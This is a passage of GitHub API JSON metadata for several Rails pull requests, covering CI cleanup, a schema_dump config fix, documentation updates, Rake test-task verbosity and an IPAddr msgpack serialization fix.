        "updated_at": "2024-01-14T13:51:30Z",
        "closed_at": "2024-01-14T07:53:13Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50747",
            "html_url": "https://github.com/rails/rails/pull/50747",
            "diff_url": "https://github.com/rails/rails/pull/50747.diff",
            "patch_url": "https://github.com/rails/rails/pull/50747.patch",
            "merged_at": "2024-01-14T07:53:13Z"
        },
        "body": "We recently removed codespell from the CI https://github.com/rails/rails/pull/50657, python was configured for running the codespell. ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50747/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50747/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50746",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50746/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50746/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50746/events",
        "html_url": "https://github.com/rails/rails/pull/50746",
        "id": 2080583266,
        "node_id": "PR_kwDNIULOZAQeOA",
        "number": 50746,
        "title": "Backport: Remove codespell step from CI from 7-1-stable",
        "user": {
            "login": "akhilgkrishnan",
            "id": 22231095,
            "node_id": "MDQ6VXNlcjIyMjMxMDk1",
            "avatar_url": "https://avatars.githubusercontent.com/u/22231095?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/akhilgkrishnan",
            "html_url": "https://github.com/akhilgkrishnan",
            "followers_url": "https://api.github.com/users/akhilgkrishnan/followers",
            "following_url": "https://api.github.com/users/akhilgkrishnan/following{/other_user}",
            "gists_url": "https://api.github.com/users/akhilgkrishnan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/akhilgkrishnan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/akhilgkrishnan/subscriptions",
            "organizations_url": "https://api.github.com/users/akhilgkrishnan/orgs",
            "repos_url": "https://api.github.com/users/akhilgkrishnan/repos",
            "events_url": "https://api.github.com/users/akhilgkrishnan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/akhilgkrishnan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-14T04:54:32Z",
        "updated_at": "2024-01-14T13:53:05Z",
        "closed_at": "2024-01-14T07:53:02Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50746",
            "html_url": "https://github.com/rails/rails/pull/50746",
            "diff_url": "https://github.com/rails/rails/pull/50746.diff",
            "patch_url": "https://github.com/rails/rails/pull/50746.patch",
            "merged_at": "2024-01-14T07:53:02Z"
        },
        "body": "Backport https://github.com/rails/rails/pull/50657 to `7-1-stable`\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50746/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50746/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50745",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50745/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50745/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50745/events",
        "html_url": "https://github.com/rails/rails/pull/50745",
        "id": 2080474102,
        "node_id": "PR_kwDNIULOZALL7w",
        "number": 50745,
        "title": "Allow `schema_dump` database config to be set via DATABASE_URL",
        "user": {
            "login": "mscoutermarsh",
            "id": 155044,
            "node_id": "MDQ6VXNlcjE1NTA0NA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/155044?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mscoutermarsh",
            "html_url": "https://github.com/mscoutermarsh",
            "followers_url": "https://api.github.com/users/mscoutermarsh/followers",
            "following_url": "https://api.github.com/users/mscoutermarsh/following{/other_user}",
            "gists_url": "https://api.github.com/users/mscoutermarsh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mscoutermarsh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mscoutermarsh/subscriptions",
            "organizations_url": "https://api.github.com/users/mscoutermarsh/orgs",
            "repos_url": "https://api.github.com/users/mscoutermarsh/repos",
            "events_url": "https://api.github.com/users/mscoutermarsh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mscoutermarsh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-13T20:59:48Z",
        "updated_at": "2024-01-15T14:57:35Z",
        "closed_at": "2024-01-15T14:57:35Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50745",
            "html_url": "https://github.com/rails/rails/pull/50745",
            "diff_url": "https://github.com/rails/rails/pull/50745.diff",
            "patch_url": "https://github.com/rails/rails/pull/50745.patch",
            "merged_at": null
        },
        "body": "In `database.yml`, `schema_dump` can currently be set to `false`, `nil` or a file path.\r\n\r\nI found that if you configure your database via DATABASE_URL, the false value does not work because it comes through as a string.\r\n\r\nThis change allows `?schema_dump=false` to disable the dump via database_url.\r\n\r\n### Additional information\r\n\r\nOriginal PR for `schema_dump` https://github.com/rails/rails/pull/42804\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50745/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50745/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50744",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50744/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50744/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50744/events",
        "html_url": "https://github.com/rails/rails/pull/50744",
        "id": 2080405528,
        "node_id": "PR_kwDNIULOZAH76A",
        "number": 50744,
        "title": "docs: Update FormHelper comments to use `form_with` instead of `form_for` [ci skip]",
        "user": {
            "login": "takatea",
            "id": 39912547,
            "node_id": "MDQ6VXNlcjM5OTEyNTQ3",
            "avatar_url": "https://avatars.githubusercontent.com/u/39912547?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/takatea",
            "html_url": "https://github.com/takatea",
            "followers_url": "https://api.github.com/users/takatea/followers",
            "following_url": "https://api.github.com/users/takatea/following{/other_user}",
            "gists_url": "https://api.github.com/users/takatea/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/takatea/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/takatea/subscriptions",
            "organizations_url": "https://api.github.com/users/takatea/orgs",
            "repos_url": "https://api.github.com/users/takatea/repos",
            "events_url": "https://api.github.com/users/takatea/events{/privacy}",
            "received_events_url": "https://api.github.com/users/takatea/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-13T17:32:39Z",
        "updated_at": "2024-01-13T17:32:43Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50744",
            "html_url": "https://github.com/rails/rails/pull/50744",
            "diff_url": "https://github.com/rails/rails/pull/50744.diff",
            "patch_url": "https://github.com/rails/rails/pull/50744.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because comments in `ActionView::Helpers::FormHelper` refer to the deprecated `form_for` instead of the recommended `form_with`. This could potentially cause confusion for developers consulting the Rails API documentation, such as [Action View Form Builder page](https://api.rubyonrails.org/classes/ActionView/Helpers/FormBuilder.html).\r\n\r\n### Detail\r\n\r\nThis Pull Request changes  the comments in `ActionView::Helpers::FormHelper`, replacing instances of `form_for` with `form_with`.\r\n\r\n### Additional information\r\n\r\nThe Rails guide has already documented the usage of `form_with` on the [form_helpers page](https://guides.rubyonrails.org/form_helpers.html).\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50744/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50744/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50743",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50743/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50743/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50743/events",
        "html_url": "https://github.com/rails/rails/pull/50743",
        "id": 2080325207,
        "node_id": "PR_kwDNIULOZAD4Vg",
        "number": 50743,
        "title": "Remove `t.verbose = true` from Rake test tasks",
        "user": {
            "login": "dorianmarie",
            "id": 71096653,
            "node_id": "MDQ6VXNlcjcxMDk2NjUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/71096653?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmarie",
            "html_url": "https://github.com/dorianmarie",
            "followers_url": "https://api.github.com/users/dorianmarie/followers",
            "following_url": "https://api.github.com/users/dorianmarie/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmarie/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmarie/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmarie/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmarie/orgs",
            "repos_url": "https://api.github.com/users/dorianmarie/repos",
            "events_url": "https://api.github.com/users/dorianmarie/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmarie/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            },
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            },
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            },
            {
                "id": 123812746,
                "node_id": "MDU6TGFiZWwxMjM4MTI3NDY=",
                "url": "https://api.github.com/repos/rails/rails/labels/activejob",
                "name": "activejob",
                "color": "5319e7",
                "default": false,
                "description": null
            },
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            },
            {
                "id": 1180817762,
                "node_id": "MDU6TGFiZWwxMTgwODE3NzYy",
                "url": "https://api.github.com/repos/rails/rails/labels/actiontext",
                "name": "actiontext",
                "color": "3bc667",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-13T14:34:14Z",
        "updated_at": "2024-01-16T08:45:10Z",
        "closed_at": "2024-01-14T08:48:53Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50743",
            "html_url": "https://github.com/rails/rails/pull/50743",
            "diff_url": "https://github.com/rails/rails/pull/50743.diff",
            "patch_url": "https://github.com/rails/rails/pull/50743.patch",
            "merged_at": null
        },
        "body": "Here is an example of the output it generated:\r\n\r\n```\r\n/Users/dorianmariefr/.asdf/installs/ruby/3.3.0/bin/ruby -w -I\"lib\" /Users/dorianmariefr/.asdf/installs/ruby/3.3.0/lib/ruby/gems/3.3.0/gems/rake-13.1.0/lib/rake/rake_test_loader.rb \"test/actionable_error_test.rb\" \"test/array_inquirer_test.rb\" \"test/autoload_test.rb\" \"test/benchmarkable_test.rb\" \"test/broadcast_logger_test.rb\" \"test/cache/cache_coder_test.rb\" \"test/cache/cache_entry_test.rb\" \"test/cache/cache_key_test.rb\" \"test/cache/cache_store_logger_test.rb\" \"test/cache/cache_store_namespace_test.rb\" \"test/cache/cache_store_setting_test.rb\" \"test/cache/local_cache_middleware_test.rb\" \"test/cache/serializer_with_fallback_test.rb\" \"test/cache/stores/file_store_test.rb\" \"test/cache/stores/mem_cache_store_test.rb\" \"test/cache/stores/memory_store_test.rb\" \"test/cache/stores/null_store_test.rb\" \"test/cache/stores/redis_cache_store_test.rb\" \"test/callback_inheritance_test.rb\" \"test/callbacks_test.rb\" \"test/clean_backtrace_test.rb\" \"test/clean_logger_test.rb\" \"test/concern_test.rb\" \"test/concurrency/load_interlock_aware_monitor_test.rb\" \"test/configurable_test.rb\" \"test/configuration_file_test.rb\" \"test/core_ext/array/access_test.rb\" \"test/core_ext/array/conversions_test.rb\" \"test/core_ext/array/extract_options_test.rb\" \"test/core_ext/array/extract_test.rb\" \"test/core_ext/array/grouping_test.rb\" \"test/core_ext/array/wrap_test.rb\" \"test/core_ext/bigdecimal_test.rb\" \"test/core_ext/class/attribute_test.rb\" \"test/core_ext/class_test.rb\" \"test/core_ext/date_and_time_compatibility_test.rb\" \"test/core_ext/date_ext_test.rb\" \"test/core_ext/date_time_ext_test.rb\" \"test/core_ext/digest/uuid_test.rb\" \"test/core_ext/duration_test.rb\" \"test/core_ext/enumerable_test.rb\" \"test/core_ext/erb_util_test.rb\" \"test/core_ext/file_test.rb\" \"test/core_ext/hash/transform_values_test.rb\" \"test/core_ext/hash_ext_test.rb\" \"test/core_ext/integer_ext_test.rb\" \"test/core_ext/kernel/concern_test.rb\" \"test/core_ext/kernel_test.rb\" \"test/core_ext/load_error_test.rb\" \"test/core_ext/module/anonymous_test.rb\" \"test/core_ext/module/attr_internal_test.rb\" \"test/core_ext/module/attribute_accessor_per_thread_test.rb\" \"test/core_ext/module/attribute_accessor_test.rb\" \"test/core_ext/module/attribute_aliasing_test.rb\" \"test/core_ext/module/concerning_test.rb\" \"test/core_ext/module/introspection_test.rb\" \"test/core_ext/module/remove_method_test.rb\" \"test/core_ext/module_test.rb\" \"test/core_ext/name_error_test.rb\" \"test/core_ext/numeric_ext_test.rb\" \"test/core_ext/object/acts_like_test.rb\" \"test/core_ext/object/blank_test.rb\" \"test/core_ext/object/deep_dup_test.rb\" \"test/core_ext/object/duplicable_test.rb\" \"test/core_ext/object/inclusion_test.rb\" \"test/core_ext/object/instance_variables_test.rb\" \"test/core_ext/object/json_cherry_pick_test.rb\" \"test/core_ext/object/json_gem_encoding_test.rb\" \"test/core_ext/object/to_param_test.rb\" \"test/core_ext/object/to_query_test.rb\" \"test/core_ext/object/try_test.rb\" \"test/core_ext/object/with_test.rb\" \"test/core_ext/pathname/blank_test.rb\" \"test/core_ext/pathname/existence_test.rb\" \"test/core_ext/range_ext_test.rb\" \"test/core_ext/regexp_ext_test.rb\" \"test/core_ext/secure_random_test.rb\" \"test/core_ext/string_ext_test.rb\" \"test/core_ext/symbol_ext_test.rb\" \"test/core_ext/time_ext_test.rb\" \"test/core_ext/time_with_zone_test.rb\" \"test/current_attributes_test.rb\" \"test/deep_mergeable_test.rb\" \"test/dependencies_test.rb\" \"test/deprecation/deprecators_test.rb\" \"test/deprecation/method_wrappers_test.rb\" \"test/deprecation/proxy_wrappers_test.rb\" \"test/deprecation_test.rb\" \"test/descendants_tracker_test.rb\" \"test/digest_test.rb\" \"test/encrypted_configuration_test.rb\" \"test/encrypted_file_test.rb\" \"test/environment_inquirer_test.rb\" \"test/error_reporter_test.rb\" \"test/evented_file_update_checker_test.rb\" \"test/execution_context_test.rb\" \"test/executor_test.rb\" \"test/file_update_checker_test.rb\" \"test/fork_tracker_test.rb\" \"test/gzip_test.rb\" \"test/hash_with_indifferent_access_test.rb\" \"test/i18n_test.rb\" \"test/inflector_test.rb\" \"test/isolated_execution_state_test.rb\" \"test/json/decoding_test.rb\" \"test/json/encoding_test.rb\" \"test/key_generator_test.rb\" \"test/lazy_load_hooks_test.rb\" \"test/log_subscriber_test.rb\" \"test/logger_test.rb\" \"test/message_encryptor_test.rb\" \"test/message_encryptors_test.rb\" \"test/message_pack/cache_serializer_test.rb\" \"test/message_pack/serializer_test.rb\" \"test/message_verifier_test.rb\" \"test/message_verifiers_test.rb\" \"test/messages/message_encryptor_metadata_test.rb\" \"test/messages/message_encryptor_rotator_test.rb\" \"test/messages/message_verifier_metadata_test.rb\" \"test/messages/message_verifier_rotator_test.rb\" \"test/messages/rotation_configuration_test.rb\" \"test/messages/serializer_with_fallback_test.rb\" \"test/multibyte_chars_test.rb\" \"test/multibyte_proxy_test.rb\" \"test/notifications/evented_notification_test.rb\" \"test/notifications/instrumenter_test.rb\" \"test/notifications_test.rb\" \"test/number_helper_i18n_test.rb\" \"test/number_helper_test.rb\" \"test/option_merger_test.rb\" \"test/ordered_hash_test.rb\" \"test/ordered_options_test.rb\" \"test/parameter_filter_test.rb\" \"test/reloader_test.rb\" \"test/rescuable_test.rb\" \"test/safe_buffer_test.rb\" \"test/secure_compare_rotator_test.rb\" \"test/security_utils_test.rb\" \"test/share_lock_test.rb\" \"test/silence_logger_test.rb\" \"test/string_inquirer_test.rb\" \"test/subscriber_test.rb\" \"test/tagged_logging_test.rb\" \"test/test_case_test.rb\" \"test/testing/after_teardown_test.rb\" \"test/testing/constant_lookup_test.rb\" \"test/testing/file_fixtures_test.rb\" \"test/testing/method_call_assertions_test.rb\" \"test/time_travel_test.rb\" \"test/time_zone_test.rb\" \"test/transliterate_test.rb\" \"test/xml_mini/jdom_engine_test.rb\" \"test/xml_mini/libxml_engine_test.rb\" \"test/xml_mini/libxmlsax_engine_test.rb\" \"test/xml_mini/nokogiri_engine_test.rb\" \"test/xml_mini/nokogirisax_engine_test.rb\" \"test/xml_mini/rexml_engine_test.rb\" \"test/xml_mini/xml_mini_engine_test.rb\" \"test/xml_mini_test.rb\"\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50743/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50743/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50742",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50742/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50742/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50742/events",
        "html_url": "https://github.com/rails/rails/pull/50742",
        "id": 2080299007,
        "node_id": "PR_kwDNIULOZAClCA",
        "number": 50742,
        "title": "Fix IPAddr prefix information missing when write to cache in msgpack serializer",
        "user": {
            "login": "r-plus",
            "id": 425216,
            "node_id": "MDQ6VXNlcjQyNTIxNg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/425216?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/r-plus",
            "html_url": "https://github.com/r-plus",
            "followers_url": "https://api.github.com/users/r-plus/followers",
            "following_url": "https://api.github.com/users/r-plus/following{/other_user}",
            "gists_url": "https://api.github.com/users/r-plus/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/r-plus/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/r-plus/subscriptions",
            "organizations_url": "https://api.github.com/users/r-plus/orgs",
            "repos_url": "https://api.github.com/users/r-plus/repos",
            "events_url": "https://api.github.com/users/r-plus/events{/privacy}",
            "received_events_url": "https://api.github.com/users/r-plus/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-13T13:24:04Z",
        "updated_at": "2024-01-15T06:58:51Z",
        "closed_at": "2024-01-15T06:54:09Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50742",
            "html_url": "https://github.com/rails/rails/pull/50742",
            "diff_url": "https://github.com/rails/rails/pull/50742.diff",
            "patch_url": "https://github.com/rails/rails/pull/50742.patch",
            "merged_at": "2024-01-15T06:54:09Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because we notice the msgpack serializer missing the prefix(netmask) data of IPAddr object when dump.\r\n\r\n### Detail\r\n\r\nThis Pull Request fixed the missing prefix(netmask) data of IPAddr object when dumping by msgpack serializer.\r\n\r\n### Additional information\r\n\r\n#### `to_s` is not contains prefix(netmask) data.\r\n\r\n```ruby\r\n IPAddr.new('192.168.0.1/24').to_s\r\n=> \"192.168.0.0\"\r\n```\r\n\r\nSo `to_s` missing the prefix(netmask) data when dump/load by msgpack serializer.\r\n\r\n```ruby\r\nirb(main):032> serializer = ActiveSupport::MessagePack::CacheSerializer\r\nirb(main):033> serializer.load(serializer.dump(IPAddr.new('192.168.0.1/24')))\r\n=> #<IPAddr: IPv4:192.168.0.0/255.255.255.255>\r\n```\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n#### IPAddr object assertion\r\nIPAddr instance equal assertion is not accurate to assert same data. This is reason why I use `inspect` for test.\r\n\r\n```ruby\r\nIPAddr.new('192.168.0.1/24') == IPAddr.new('192.168.0.0/32')\r\n=> true\r\nirb(main):027> IPAddr.new('192.168.0.1/24').inspect == IPAddr.new('192.168.0.0').inspect\r\n=> false\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50742/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50742/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50741",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50741/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50741/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50741/events",
        "html_url": "https://github.com/rails/rails/pull/50741",
        "id": 2080273836,
        "node_id": "PR_kwDNIULOZABRIg",
        "number": 50741,
        "title": "Fix failing test due to active_model not loading",
        "user": {
            "login": "koya1616",
            "id": 87183507,
            "node_id": "MDQ6VXNlcjg3MTgzNTA3",
            "avatar_url": "https://avatars.githubusercontent.com/u/87183507?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/koya1616",
            "html_url": "https://github.com/koya1616",
            "followers_url": "https://api.github.com/users/koya1616/followers",
            "following_url": "https://api.github.com/users/koya1616/following{/other_user}",
            "gists_url": "https://api.github.com/users/koya1616/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/koya1616/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/koya1616/subscriptions",
            "organizations_url": "https://api.github.com/users/koya1616/orgs",
